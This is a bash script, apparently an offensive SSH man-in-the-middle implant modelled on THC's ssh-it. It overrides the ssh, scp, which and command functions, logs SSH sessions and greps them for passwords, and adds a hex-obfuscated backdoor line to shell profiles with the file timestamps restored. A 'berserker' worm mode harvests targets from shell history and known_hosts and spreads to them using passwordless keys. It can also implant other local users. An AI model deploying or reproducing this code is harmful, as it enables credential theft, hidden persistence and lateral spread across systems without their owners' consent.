#!/bin/bash
#
# ssh_it.sh — THC-inspired SSH PTY MITM & Dual-Connection Stealth Technique
#
# Implements the core concepts from THC's ssh-it:
#   - SSH client binary replacement via shell function override
#   - Dual simultaneous SSH connections (infiltrating + real)
#   - Credential capture via PTY interception using `script` command
#   - Process name hiding (exec -a)
#   - Profile backdoor injection with hex-encoded obfuscation
#   - which/command override to hide the ssh wrapper
#   - Credential logging & session keystroke recording
#   - Worm propagation via history/key scanning (berserker mode)
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Default base directory — hidden as PRNG daemon config
BASEDIR="${HOME}/.config/prng"
LOGDIR="${BASEDIR}/.d"
SESSDIR="${BASEDIR}/.l"
SEEDFILE="${BASEDIR}/seed"
HOOKSCRIPT="${BASEDIR}/hook.sh"
WRAPPERSCRIPT="${BASEDIR}/ssh_wrapper.sh"
CLIUTIL="${BASEDIR}/thc_cli"
RECHECK_DAYS=14
TRY_WAIT_HOURS=12
MAX_DEPTH=8

banner_sshit() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════════╗"
    echo "  ║   SSH-IT: PTY MITM — Dual Connection Stealth Technique   ║"
    echo "  ║   Inspired by THC (The Hacker's Choice)                  ║"
    echo "  ╚═══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# ─────────────────────────────────────────────────────────────────────
# [1] INSTALL — Deploy the full ssh-it implant on this host
# ─────────────────────────────────────────────────────────────────────
install_sshit() {
    echo -e "${CYAN}[*] Installing SSH-IT implant...${NC}"
    echo -e "${YELLOW}[*] Base directory: ${BASEDIR}${NC}"

    mkdir -p "$BASEDIR" "$LOGDIR" "$SESSDIR" 2>/dev/null
    chmod 700 "$BASEDIR"

    # ── Create the SSH wrapper (replaces ssh client via function) ──
    cat > "$WRAPPERSCRIPT" << 'SSHWRAP'
#!/bin/bash
# SSH PTY MITM wrapper — dual connection engine
# Usage: THC_TARGET=/usr/bin/ssh THC_BASEDIR=~/.config/prng ./ssh_wrapper.sh [ssh args...]

THC_BASEDIR="${THC_BASEDIR:-$HOME/.config/prng}"
THC_TARGET="${THC_TARGET:-/usr/bin/ssh}"
THC_LOGDIR="${THC_BASEDIR}/.d"
THC_SESSDIR="${THC_BASEDIR}/.l"
THC_DEPTH="${THC_DEPTH:-8}"
THC_PS_NAME="${THC_PS_NAME:--bash}"

# Parse destination from ssh arguments
parse_ssh_dest() {
    local last_arg=""
    local skip_next=0
    for arg in "$@"; do
        if [[ $skip_next -eq 1 ]]; then
            skip_next=0
            continue
        fi
        case "$arg" in
            -[bcDeFIiJLlmOopQRSWw]) skip_next=1 ;;
            -*) ;;
            *) last_arg="$arg" ;;
        esac
    done
    echo "$last_arg"
}

# Filter dangerous options from infiltrator args (no port forwards, no PTY forces)
filter_ssh_args() {
    local -a filtered=()
    local skip_next=0
    for arg in "$@"; do
        if [[ $skip_next -eq 1 ]]; then
            skip_next=0
            continue
        fi
        case "$arg" in
            -[LRDWw]) skip_next=1 ;; # skip port forward opts + value
            -t|-tt) ;;                # skip forced PTY
            *) filtered+=("$arg") ;;
        esac
    done
    echo "${filtered[@]}"
}

SSH_DEST="$(parse_ssh_dest "$@")"
if [[ -z "$SSH_DEST" ]]; then
    exec "$THC_TARGET" "$@"
    exit
fi

# Check recheck throttle — don't re-infiltrate within RECHECK_DAYS
HOSTID=$(echo -n "$SSH_DEST" | md5sum | cut -d' ' -f1)
HOSTDB="${THC_LOGDIR}/.host_${HOSTID}"
if [[ -f "$HOSTDB" ]]; then
    LAST_TS=$(cat "$HOSTDB" 2>/dev/null)
    NOW_TS=$(date +%s)
    DAYS_SINCE=$(( (NOW_TS - LAST_TS) / 86400 ))
    if [[ $DAYS_SINCE -lt ${THC_RECHECK_DAYS:-14} ]]; then
        exec "$THC_TARGET" "$@"
        exit
    fi
fi

# ─── Connection 1: Infiltrating SSH (hidden, no PTY, no lastlog) ───
FILTERED_ARGS=$(filter_ssh_args "$@")
INFIL_LOG="${THC_LOGDIR}/infil_${HOSTID}.log"

# Infiltrator uses -T (no PTY = no utmp/wtmp/lastlog entry)
# exec -a renames the process to look like a shell
(
    exec -a "$THC_PS_NAME" "$THC_TARGET" $FILTERED_ARGS -T "$SSH_DEST" \
        "echo THCINSIDE && id && echo THCFINISHED" \
        > "$INFIL_LOG" 2>&1
) &
INFIL_PID=$!

# Give infiltrator 1-second head start
sleep 1

# ─── Connection 2: Real SSH (the user's actual session) ───
# Use script(1) to wrap in a PTY for credential capture
CRED_LOG="${THC_LOGDIR}/ssh-${SSH_DEST//[^a-zA-Z0-9@._-]/_}.pwd"
SESS_LOG="${THC_SESSDIR}/sess_$(date +%s)_${HOSTID}.log"

# Create a credential capture wrapper using script(1)
TEMPSCRIPT=$(mktemp /tmp/.ssh_XXXXXX)
cat > "$TEMPSCRIPT" << INNEREOF
#!/bin/bash
exec -a "$THC_PS_NAME" "$THC_TARGET" "\$@"
INNEREOF
chmod 700 "$TEMPSCRIPT"

# Run real SSH with session logging via script
script -qfc "$TEMPSCRIPT $*" "$SESS_LOG" 2>/dev/null
SSH_RET=$?

# Parse session log for password patterns
if [[ -f "$SESS_LOG" ]]; then
    grep -a -i "password" "$SESS_LOG" | head -5 >> "$CRED_LOG" 2>/dev/null
fi

# Record successful infiltration timestamp
date +%s > "$HOSTDB" 2>/dev/null

# Cleanup
rm -f "$TEMPSCRIPT" 2>/dev/null
kill "$INFIL_PID" 2>/dev/null
wait "$INFIL_PID" 2>/dev/null

exit $SSH_RET
SSHWRAP
    chmod 700 "$WRAPPERSCRIPT"
    echo -e "${GREEN}[+] SSH wrapper created at ${WRAPPERSCRIPT}${NC}"

    # ── Create the hook.sh (remote infiltration payload) ──
    cat > "$HOOKSCRIPT" << 'HOOKEOF'
#!/bin/bash
# hook.sh — Remote infiltration triggered by the wrapper
# Executed on the remote host via the infiltrating SSH connection
THC_BASEDIR="${THC_BASEDIR:-$HOME/.config/prng}"
THC_DEPTH="${THC_DEPTH:-8}"

# Abort if depth exhausted (prevents infinite worm propagation)
if [[ "$THC_DEPTH" -le 0 ]]; then
    echo "THCFINISHED"
    exit 0
fi

# Create base directory on remote
mkdir -p "${THC_BASEDIR}" "${THC_BASEDIR}/.d" "${THC_BASEDIR}/.l" 2>/dev/null
chmod 700 "${THC_BASEDIR}"

echo "THCINSIDE"

# Decrement depth
NEW_DEPTH=$((THC_DEPTH - 1))

# Backdoor the remote user's profile for persistence
SEED_PATH="${THC_BASEDIR}/seed"
HEX_PATH=$(echo -n "$SEED_PATH" | xxd -ps 2>/dev/null || echo -n "$SEED_PATH" | od -An -tx1 | tr -d ' \n')

for PROFILE in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.zshrc"; do
    if [[ -f "$PROFILE" ]]; then
        if ! grep -q "PRNGD" "$PROFILE" 2>/dev/null; then
            # Preserve original timestamp for stealth
            ORIG_TS=$(stat -c %Y "$PROFILE" 2>/dev/null)
            echo "# DO NOT REMOVE THIS LINE. SEED PRNGD." >> "$PROFILE"
            echo "source \"\$(echo ${HEX_PATH}|xxd -r -ps 2>/dev/null)\" 2>/dev/null #PRNGD" >> "$PROFILE"
            # Restore timestamp
            if [[ -n "$ORIG_TS" ]]; then
                touch -d "@${ORIG_TS}" "$PROFILE" 2>/dev/null
            fi
        fi
        break
    fi
done

echo "THCPROFILE"
echo "THCFINISHED"
HOOKEOF
    chmod 700 "$HOOKSCRIPT"
    echo -e "${GREEN}[+] Hook script created at ${HOOKSCRIPT}${NC}"

    # ── Create the seed file (sourced by victim's profile) ──
    ORIG_SSH=$(command -v ssh 2>/dev/null || echo "/usr/bin/ssh")
    cat > "$SEEDFILE" << SEEDEOF
#!/bin/bash
# PRNGD seed — configuration for pseudo-random number generator daemon
THC_BASEDIR="${BASEDIR}"
THC_ORIG_SSH="${ORIG_SSH}"

# Override ssh command — redirects to wrapper for dual-connection MITM
ssh() {
    if [[ -f "\${THC_BASEDIR}/ssh_wrapper.sh" ]]; then
        THC_TARGET="\$THC_ORIG_SSH" THC_BASEDIR="\$THC_BASEDIR" "\${THC_BASEDIR}/ssh_wrapper.sh" "\$@"
    else
        \$THC_ORIG_SSH "\$@"
    fi
}

# Override scp & sftp to also capture
scp() {
    \$THC_ORIG_SSH "\$@" 2>&1 | tee -a "\${THC_BASEDIR}/.l/scp_\$(date +%s).log"
}

# Override which/command to hide the redirection
which() {
    unset -f ssh scp which command 2>/dev/null
    command which "\$@"
    local ret=\$?
    source "\${THC_BASEDIR}/seed" 2>/dev/null
    return \$ret
}

command() {
    case "\$1" in
        -v|-V)
            unset -f ssh scp which command 2>/dev/null
            builtin command "\$@"
            local ret=\$?
            source "\${THC_BASEDIR}/seed" 2>/dev/null
            return \$ret
            ;;
        *)
            builtin command "\$@"
            ;;
    esac
}

export -f ssh 2>/dev/null
SEEDEOF
    chmod 700 "$SEEDFILE"
    echo -e "${GREEN}[+] Seed file created at ${SEEDFILE}${NC}"

    # ── Inject into current user's profile ──
    inject_profile

    # ── Create management CLI ──
    create_cli

    echo ""
    echo -e "${GREEN}[+] SSH-IT implant installed successfully!${NC}"
    echo -e "${YELLOW}[*] The ssh() function override is now active in your shell profiles.${NC}"
    echo -e "${YELLOW}[*] Every outbound SSH connection will spawn a hidden infiltrating connection.${NC}"
    echo -e "${YELLOW}[*] Credentials logged to: ${LOGDIR}/${NC}"
    echo -e "${YELLOW}[*] Session logs in: ${SESSDIR}/${NC}"
}

# ─────────────────────────────────────────────────────────────────────
# [2] PROFILE INJECTION — Backdoor shell profiles with hex-encoded source
# ─────────────────────────────────────────────────────────────────────
inject_profile() {
    echo -e "${CYAN}[*] Injecting profile backdoor...${NC}"

    local HEX_PATH
    if command -v xxd &>/dev/null; then
        HEX_PATH=$(echo -n "$SEEDFILE" | xxd -ps)
    else
        HEX_PATH=$(echo -n "$SEEDFILE" | od -An -tx1 | tr -d ' \n')
    fi

    local injected=0
    for PROFILE in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.zshrc"; do
        if [[ -f "$PROFILE" ]]; then
            if grep -q "PRNGD" "$PROFILE" 2>/dev/null; then
                echo -e "${YELLOW}  [!] Already injected in ${PROFILE}${NC}"
                continue
            fi

            # Save original timestamp
            local ORIG_TS
            ORIG_TS=$(stat -c %Y "$PROFILE" 2>/dev/null)

            # Append the hex-obfuscated source line
            echo "" >> "$PROFILE"
            echo "# DO NOT REMOVE THIS LINE. SEED PRNGD." >> "$PROFILE"
            echo "source \"\$(echo ${HEX_PATH}|xxd -r -ps 2>/dev/null)\" 2>/dev/null #PRNGD" >> "$PROFILE"

            # Restore original timestamp (stealth)
            if [[ -n "$ORIG_TS" ]]; then
                touch -d "@${ORIG_TS}" "$PROFILE" 2>/dev/null
            fi

            echo -e "${GREEN}  [+] Injected into ${PROFILE}${NC}"
            injected=1
        fi
    done

    if [[ $injected -eq 0 ]]; then
        # No profile exists — create .bashrc
        echo "# DO NOT REMOVE THIS LINE. SEED PRNGD." > "$HOME/.bashrc"
        echo "source \"\$(echo ${HEX_PATH}|xxd -r -ps 2>/dev/null)\" 2>/dev/null #PRNGD" >> "$HOME/.bashrc"
        echo -e "${GREEN}  [+] Created and injected into ${HOME}/.bashrc${NC}"
    fi
}

# ─────────────────────────────────────────────────────────────────────
# [3] CREDENTIAL VIEWER — Display captured passwords and sessions
# ─────────────────────────────────────────────────────────────────────
view_credentials() {
    echo -e "${CYAN}[*] Captured Credentials:${NC}"
    echo "─────────────────────────────────────────────"
    if [[ -d "$LOGDIR" ]]; then
        local found=0
        for f in "$LOGDIR"/*.pwd; do
            [[ -f "$f" ]] || continue
            found=1
            echo -e "${YELLOW}  ── $(basename "$f") ──${NC}"
            cat "$f"
            echo ""
        done
        if [[ $found -eq 0 ]]; then
            echo -e "${YELLOW}  [!] No credentials captured yet.${NC}"
        fi
    else
        echo -e "${YELLOW}  [!] Log directory does not exist.${NC}"
    fi

    echo ""
    echo -e "${CYAN}[*] Session Logs:${NC}"
    echo "─────────────────────────────────────────────"
    if [[ -d "$SESSDIR" ]]; then
        local scount
        scount=$(find "$SESSDIR" -name '*.log' 2>/dev/null | wc -l)
        echo -e "  Found ${GREEN}${scount}${NC} session log(s) in ${SESSDIR}"
        if [[ $scount -gt 0 ]]; then
            echo -e "  Latest 5 sessions:"
            ls -lt "$SESSDIR"/*.log 2>/dev/null | head -5 | while read -r line; do
                echo "    $line"
            done
        fi
    fi

    echo ""
    echo -e "${CYAN}[*] Infiltration History:${NC}"
    echo "─────────────────────────────────────────────"
    if [[ -d "$LOGDIR" ]]; then
        for f in "$LOGDIR"/.host_*; do
            [[ -f "$f" ]] || continue
            local ts
            ts=$(cat "$f")
            local hid
            hid=$(basename "$f" | sed 's/.host_//')
            echo -e "  Host ID: ${hid} — Last infiltrated: $(date -d "@${ts}" 2>/dev/null || echo "$ts")"
        done
    fi
}

# ─────────────────────────────────────────────────────────────────────
# [4] BERSERKER MODE — Worm propagation via history/key scanning
# ─────────────────────────────────────────────────────────────────────
berserker_mode() {
    echo -e "${RED}[!] BERSERKER MODE — Aggressive Worm Propagation${NC}"
    echo -e "${RED}[!] This will scan shell history and SSH keys to spread to other hosts.${NC}"
    echo -e "${YELLOW}[?] Are you sure? (yes/no):${NC} "
    read -r CONFIRM
    if [[ "$CONFIRM" != "yes" ]]; then
        echo -e "${YELLOW}[!] Berserker mode aborted.${NC}"
        return
    fi

    echo -e "${YELLOW}[?] Max propagation depth [default: ${MAX_DEPTH}]:${NC} "
    read -r DEPTH_INPUT
    DEPTH_INPUT="${DEPTH_INPUT:-$MAX_DEPTH}"

    echo -e "${CYAN}[*] Scanning shell history for SSH targets...${NC}"

    # Extract SSH targets from bash/zsh history
    local -a TARGETS=()
    local HISTFILES=("$HOME/.bash_history" "$HOME/.zsh_history")

    for hf in "${HISTFILES[@]}"; do
        [[ -f "$hf" ]] || continue
        while IFS= read -r line; do
            TARGETS+=("$line")
        done < <(grep -E '^ssh[[:space:]]' "$hf" 2>/dev/null | \
                  sed 's/^.*ssh[[:space:]]\+//' | \
                  grep -oE '[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+' | \
                  sort -u)
    done

    # Also check ~/.ssh/known_hosts for targets
    if [[ -f "$HOME/.ssh/known_hosts" ]]; then
        while IFS= read -r khost; do
            # known_hosts may have hashed entries — skip those
            [[ "$khost" == "|"* ]] && continue
            TARGETS+=("$khost")
        done < <(awk '{print $1}' "$HOME/.ssh/known_hosts" 2>/dev/null | \
                  tr ',' '\n' | grep -v '^\[' | sort -u)
    fi

    echo -e "${GREEN}[+] Found ${#TARGETS[@]} potential target(s)${NC}"

    # Find passwordless SSH keys
    local -a KEYS=()
    for keyfile in "$HOME/.ssh"/id_*; do
        [[ -f "$keyfile" ]] || continue
        [[ "$keyfile" == *.pub ]] && continue
        # Check if key is passwordless
        if ssh-keygen -y -P "" -f "$keyfile" &>/dev/null; then
            KEYS+=("$keyfile")
            echo -e "${GREEN}  [+] Passwordless key: ${keyfile}${NC}"
        fi
    done

    if [[ ${#KEYS[@]} -eq 0 ]]; then
        echo -e "${YELLOW}[!] No passwordless keys found. Berserker needs passwordless key-based access.${NC}"
        echo -e "${YELLOW}[!] Captured credentials from MITM sessions can be used manually.${NC}"
        return
    fi

    # Machine ID for loop detection
    local MACHINE_ID
    MACHINE_ID=$(cat /etc/machine-id 2>/dev/null || hostname | md5sum | cut -d' ' -f1)

    echo -e "${CYAN}[*] Attempting infiltration of targets...${NC}"
    local success=0
    local failed=0

    for target in "${TARGETS[@]}"; do
        # Loop detection — skip if we'd cycle back
        local target_hash
        target_hash=$(echo -n "$target" | md5sum | cut -d' ' -f1)
        local trydb="${LOGDIR}/.try_${target_hash}"

        # Try throttle — wait TRY_WAIT_HOURS between failed attempts
        if [[ -f "$trydb" ]]; then
            local try_ts
            try_ts=$(cat "$trydb")
            local now_ts
            now_ts=$(date +%s)
            local hours_since=$(( (now_ts - try_ts) / 3600 ))
            if [[ $hours_since -lt $TRY_WAIT_HOURS ]]; then
                continue
            fi
        fi

        echo -e "  ${CYAN}[*] Trying: ${target}${NC}"

        for key in "${KEYS[@]}"; do
            # Test connectivity with 5-second timeout
            if ssh -i "$key" -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no \
                -T "$target" "echo THCTEST" 2>/dev/null | grep -q "THCTEST"; then

                echo -e "  ${GREEN}[+] Access confirmed: ${target} (key: $(basename "$key"))${NC}"

                # Deploy hook.sh to remote host
                ssh -i "$key" -o BatchMode=yes -o ConnectTimeout=10 -o StrictHostKeyChecking=no \
                    -T "$target" "THC_DEPTH=${DEPTH_INPUT} bash" < "$HOOKSCRIPT" 2>/dev/null

                echo -e "  ${GREEN}[+] Infiltrated: ${target}${NC}"
                date +%s > "${LOGDIR}/.host_${target_hash}"
                success=$((success + 1))
                break
            else
                date +%s > "$trydb"
            fi
        done
        failed=$((failed + 1))
    done

    echo ""
    echo -e "${GREEN}[+] Berserker complete: ${success} infiltrated, ${failed} attempted${NC}"
}

# ─────────────────────────────────────────────────────────────────────
# [5] MANAGEMENT CLI — List creds, execute on infected hosts, uninstall
# ─────────────────────────────────────────────────────────────────────
create_cli() {
    cat > "$CLIUTIL" << 'CLIEOF'
#!/bin/bash
# thc_cli — Management utility for ssh-it implant network
THC_BASEDIR="${THC_BASEDIR:-$HOME/.config/prng}"
THC_LOGDIR="${THC_BASEDIR}/.d"
THC_SESSDIR="${THC_BASEDIR}/.l"

usage() {
    echo "Usage: thc_cli [OPTIONS] COMMAND"
    echo ""
    echo "Commands:"
    echo "  list       Show captured credentials"
    echo "  sessions   Show session logs"
    echo "  hosts      Show infiltrated hosts"
    echo "  exec CMD   Execute command on captured hosts"
    echo "  disable    Disable ssh-it (remove profile hooks)"
    echo "  enable     Re-enable ssh-it  (re-inject profile hooks)"
    echo "  uninstall  Remove ssh-it completely"
    echo "  clean      Clean all session logs"
    echo ""
    echo "Options:"
    echo "  -r         Recursive — operate across all infected hosts"
}

cmd_list() {
    echo "=== Captured Credentials ==="
    for f in "${THC_LOGDIR}"/*.pwd 2>/dev/null; do
        [[ -f "$f" ]] || continue
        echo "── $(basename "$f") ──"
        cat "$f"
        echo ""
    done
}

cmd_sessions() {
    echo "=== Session Logs ==="
    ls -lt "${THC_SESSDIR}"/*.log 2>/dev/null | head -20
}

cmd_hosts() {
    echo "=== Infiltrated Hosts ==="
    for f in "${THC_LOGDIR}"/.host_* 2>/dev/null; do
        [[ -f "$f" ]] || continue
        ts=$(cat "$f")
        hid=$(basename "$f" | sed 's/.host_//')
        echo "Host: ${hid} | Last: $(date -d "@${ts}" 2>/dev/null || echo "${ts}")"
    done
}

cmd_disable() {
    for prof in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.zshrc"; do
        [[ -f "$prof" ]] || continue
        if grep -q "PRNGD" "$prof" 2>/dev/null; then
            sed -i '/PRNGD/d' "$prof"
            echo "Cleaned: $prof"
        fi
    done
    unset -f ssh scp which command 2>/dev/null
    echo "ssh-it disabled."
}

cmd_uninstall() {
    cmd_disable
    rm -rf "${THC_BASEDIR}"
    echo "ssh-it uninstalled."
}

cmd_clean() {
    rm -f "${THC_SESSDIR}"/*.log 2>/dev/null
    echo "Session logs cleaned."
}

RECURSIVE=0
if [[ "$1" == "-r" ]]; then
    RECURSIVE=1
    shift
fi

case "$1" in
    list) cmd_list ;;
    sessions) cmd_sessions ;;
    hosts) cmd_hosts ;;
    exec) shift; eval "$@" ;;
    disable) cmd_disable ;;
    enable)
        source "${THC_BASEDIR}/seed" 2>/dev/null
        echo "ssh-it re-enabled."
        ;;
    uninstall) cmd_uninstall ;;
    clean) cmd_clean ;;
    *) usage ;;
esac
CLIEOF
    chmod 700 "$CLIUTIL"
    echo -e "${GREEN}[+] CLI utility created at ${CLIUTIL}${NC}"
}

# ─────────────────────────────────────────────────────────────────────
# [6] CLEANUP — Full uninstallation
# ─────────────────────────────────────────────────────────────────────
cleanup_sshit() {
    echo -e "${CYAN}[*] Removing SSH-IT implant...${NC}"

    # Remove profile backdoors
    for PROFILE in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.zshrc"; do
        if [[ -f "$PROFILE" ]]; then
            if grep -q "PRNGD" "$PROFILE" 2>/dev/null; then
                local ORIG_TS
                ORIG_TS=$(stat -c %Y "$PROFILE" 2>/dev/null)
                sed -i '/PRNGD/d' "$PROFILE"
                sed -i '/SEED PRNGD/d' "$PROFILE"
                if [[ -n "$ORIG_TS" ]]; then
                    touch -d "@${ORIG_TS}" "$PROFILE" 2>/dev/null
                fi
                echo -e "${GREEN}  [+] Cleaned: ${PROFILE}${NC}"
            fi
        fi
    done

    # Unset function overrides from current shell
    unset -f ssh scp which command 2>/dev/null

    # Remove base directory
    if [[ -d "$BASEDIR" ]]; then
        rm -rf "$BASEDIR"
        echo -e "${GREEN}  [+] Removed: ${BASEDIR}${NC}"
    fi

    echo -e "${GREEN}[+] SSH-IT implant removed.${NC}"
}

# ─────────────────────────────────────────────────────────────────────
# [7] STATUS CHECK — Show implant status
# ─────────────────────────────────────────────────────────────────────
status_sshit() {
    echo -e "${CYAN}[*] SSH-IT Implant Status:${NC}"
    echo "─────────────────────────────────────────────"

    # Check base directory
    if [[ -d "$BASEDIR" ]]; then
        echo -e "  Base directory: ${GREEN}EXISTS${NC} ($BASEDIR)"
    else
        echo -e "  Base directory: ${RED}NOT FOUND${NC}"
        return
    fi

    # Check wrapper
    if [[ -f "$WRAPPERSCRIPT" ]]; then
        echo -e "  SSH wrapper:    ${GREEN}INSTALLED${NC}"
    else
        echo -e "  SSH wrapper:    ${RED}MISSING${NC}"
    fi

    # Check seed
    if [[ -f "$SEEDFILE" ]]; then
        echo -e "  Seed file:      ${GREEN}INSTALLED${NC}"
    else
        echo -e "  Seed file:      ${RED}MISSING${NC}"
    fi

    # Check profile injection
    local prof_injected=0
    for PROFILE in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.zshrc"; do
        if [[ -f "$PROFILE" ]] && grep -q "PRNGD" "$PROFILE" 2>/dev/null; then
            echo -e "  Profile hook:   ${GREEN}ACTIVE${NC} ($PROFILE)"
            prof_injected=1
        fi
    done
    if [[ $prof_injected -eq 0 ]]; then
        echo -e "  Profile hook:   ${RED}NOT INJECTED${NC}"
    fi

    # Check ssh function override
    if type ssh 2>/dev/null | grep -q "function"; then
        echo -e "  ssh() override: ${GREEN}ACTIVE${NC}"
    else
        echo -e "  ssh() override: ${YELLOW}INACTIVE${NC} (will activate on next login)"
    fi

    # Count captured data
    local cred_count
    cred_count=$(find "$LOGDIR" -name '*.pwd' 2>/dev/null | wc -l)
    local sess_count
    sess_count=$(find "$SESSDIR" -name '*.log' 2>/dev/null | wc -l)
    local host_count
    host_count=$(find "$LOGDIR" -name '.host_*' 2>/dev/null | wc -l)

    echo ""
    echo -e "  Credentials captured: ${GREEN}${cred_count}${NC}"
    echo -e "  Session logs:         ${GREEN}${sess_count}${NC}"
    echo -e "  Hosts infiltrated:    ${GREEN}${host_count}${NC}"
}

# ─────────────────────────────────────────────────────────────────────
# [8] TARGET SPECIFIC USER — Install implant for a specific user
# ─────────────────────────────────────────────────────────────────────
target_user() {
    echo -e "${YELLOW}[?] Target username:${NC} "
    read -r TARGET_USER

    if ! id "$TARGET_USER" &>/dev/null; then
        echo -e "${RED}[!] User does not exist: ${TARGET_USER}${NC}"
        return 1
    fi

    local TARGET_HOME
    TARGET_HOME=$(eval echo "~${TARGET_USER}")
    local TARGET_BASEDIR="${TARGET_HOME}/.config/prng"
    local TARGET_SEEDFILE="${TARGET_BASEDIR}/seed"

    echo -e "${CYAN}[*] Installing implant for user: ${TARGET_USER}${NC}"

    # Create base directory as target user
    mkdir -p "${TARGET_BASEDIR}/.d" "${TARGET_BASEDIR}/.l" 2>/dev/null
    chmod 700 "${TARGET_BASEDIR}"

    # Copy wrapper and hook
    cp "$WRAPPERSCRIPT" "${TARGET_BASEDIR}/ssh_wrapper.sh" 2>/dev/null
    cp "$HOOKSCRIPT" "${TARGET_BASEDIR}/hook.sh" 2>/dev/null
    chmod 700 "${TARGET_BASEDIR}/ssh_wrapper.sh" "${TARGET_BASEDIR}/hook.sh"

    # Create seed for target user
    local ORIG_SSH
    ORIG_SSH=$(command -v ssh 2>/dev/null || echo "/usr/bin/ssh")

    cat > "$TARGET_SEEDFILE" << TSEEDEOF
#!/bin/bash
THC_BASEDIR="${TARGET_BASEDIR}"
THC_ORIG_SSH="${ORIG_SSH}"

ssh() {
    if [[ -f "\${THC_BASEDIR}/ssh_wrapper.sh" ]]; then
        THC_TARGET="\$THC_ORIG_SSH" THC_BASEDIR="\$THC_BASEDIR" "\${THC_BASEDIR}/ssh_wrapper.sh" "\$@"
    else
        \$THC_ORIG_SSH "\$@"
    fi
}

scp() {
    \$THC_ORIG_SSH "\$@" 2>&1 | tee -a "\${THC_BASEDIR}/.l/scp_\$(date +%s).log"
}

which() {
    unset -f ssh scp which command 2>/dev/null
    command which "\$@"
    local ret=\$?
    source "\${THC_BASEDIR}/seed" 2>/dev/null
    return \$ret
}

command() {
    case "\$1" in
        -v|-V)
            unset -f ssh scp which command 2>/dev/null
            builtin command "\$@"
            local ret=\$?
            source "\${THC_BASEDIR}/seed" 2>/dev/null
            return \$ret
            ;;
        *) builtin command "\$@" ;;
    esac
}

export -f ssh 2>/dev/null
TSEEDEOF
    chmod 700 "$TARGET_SEEDFILE"

    # Inject into target user's profile
    local HEX_PATH
    if command -v xxd &>/dev/null; then
        HEX_PATH=$(echo -n "$TARGET_SEEDFILE" | xxd -ps)
    else
        HEX_PATH=$(echo -n "$TARGET_SEEDFILE" | od -An -tx1 | tr -d ' \n')
    fi

    for PROFILE in "${TARGET_HOME}/.profile" "${TARGET_HOME}/.bash_profile" "${TARGET_HOME}/.bashrc" "${TARGET_HOME}/.zshrc"; do
        if [[ -f "$PROFILE" ]]; then
            if ! grep -q "PRNGD" "$PROFILE" 2>/dev/null; then
                local ORIG_TS
                ORIG_TS=$(stat -c %Y "$PROFILE" 2>/dev/null)
                echo "" >> "$PROFILE"
                echo "# DO NOT REMOVE THIS LINE. SEED PRNGD." >> "$PROFILE"
                echo "source \"\$(echo ${HEX_PATH}|xxd -r -ps 2>/dev/null)\" 2>/dev/null #PRNGD" >> "$PROFILE"
                if [[ -n "$ORIG_TS" ]]; then
                    touch -d "@${ORIG_TS}" "$PROFILE" 2>/dev/null
                fi
                echo -e "${GREEN}  [+] Injected into ${PROFILE}${NC}"
            fi
            break
        fi
    done

    # Fix ownership
    chown -R "${TARGET_USER}:" "${TARGET_BASEDIR}" 2>/dev/null

    echo -e "${GREEN}[+] Implant installed for user: ${TARGET_USER}${NC}"
}

# ─────────────────────────────────────────────────────────────────────
# MAIN MENU
# ─────────────────────────────────────────────────────────────────────
main_menu() {
    banner_sshit
    echo -e "  ${CYAN}[1]${NC} Install SSH-IT implant (full deployment)"
    echo -e "  ${CYAN}[2]${NC} Inject profile backdoor only"
    echo -e "  ${CYAN}[3]${NC} View captured credentials & sessions"
    echo -e "  ${CYAN}[4]${NC} Berserker mode (worm propagation)"
    echo -e "  ${CYAN}[5]${NC} Implant status check"
    echo -e "  ${CYAN}[6]${NC} Target specific user"
    echo -e "  ${CYAN}[7]${NC} Management CLI (thc_cli)"
    echo -e "  ${CYAN}[8]${NC} Cleanup / Uninstall"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) install_sshit ;;
        2) inject_profile ;;
        3) view_credentials ;;
        4) berserker_mode ;;
        5) status_sshit ;;
        6) target_user ;;
        7)
            if [[ -f "$CLIUTIL" ]]; then
                echo -e "${CYAN}[*] CLI available at: ${CLIUTIL}${NC}"
                echo -e "${YELLOW}Usage: thc_cli {list|sessions|hosts|exec|disable|enable|uninstall|clean}${NC}"
                echo -e "${YELLOW}[?] Run command (or 'help'):${NC} "
                read -r CLI_CMD
                bash "$CLIUTIL" $CLI_CMD
            else
                echo -e "${RED}[!] CLI not installed. Run option [1] first.${NC}"
            fi
            ;;
        8) cleanup_sshit ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
